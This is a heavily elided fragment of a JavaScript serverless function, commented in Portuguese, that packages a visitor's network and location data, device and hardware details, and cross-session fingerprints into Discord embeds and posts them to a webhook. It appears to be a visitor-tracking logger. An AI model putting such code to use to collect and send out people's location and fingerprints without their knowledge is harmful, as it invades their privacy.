...
exports.handler = async function(event, context) {
    ...
    if(!DISCORD_WEBHOOK_URL) return {statusCode:500,body:'Webhook URL não configurada.'};
    ...
    try{
        ...
        // ── Behavioral update (sent separately after 4s) ──
        ...
        // ── Main fingerprint embeds (Dividido em 3 para não estourar o limite de 25 campos) ──
        const mapsUrl = d.loc && d.loc !== 'N/A'
            ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(d.loc)}`
            : null;

        // Embed 1: Rede e Localização
        const embed1 = {
            ...
            fields: [
                ...
                {name:'🔍 Verdict',            value: (d.locVerdict||'N/A').slice(0,200),   inline:false},
        ...
        // Embed 2: Dispositivo e Hardware
        const embed2 = {
        ...
        // Embed 3: Fingerprints e Cross-session
        const embed3 = {
        ...
        await fetch(DISCORD_WEBHOOK_URL,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({embeds:[embed1, embed2, embed3]}), // Enviando os 3 de uma vez!
        });
